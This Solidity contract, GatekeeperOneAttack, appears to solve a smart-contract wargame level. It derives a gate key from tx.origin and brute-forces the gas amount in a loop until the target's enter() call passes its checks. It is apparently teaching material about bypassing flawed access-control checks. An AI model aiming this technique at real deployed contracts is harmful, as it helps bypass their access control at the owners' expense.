// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        bytes8 _gateKey = bytes8(
            uint64(uint16(uint160(tx.origin))) | 0x8000000000000000
        );

        for (uint256 i = 0; i < 8191; i++) {
            // force attack to pass GateTwo by controlling gas left
            (bool success, ) = target.call{gas: i + (8191 * 10)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );

            if (success) {
                return;
            }
        }
    }
}
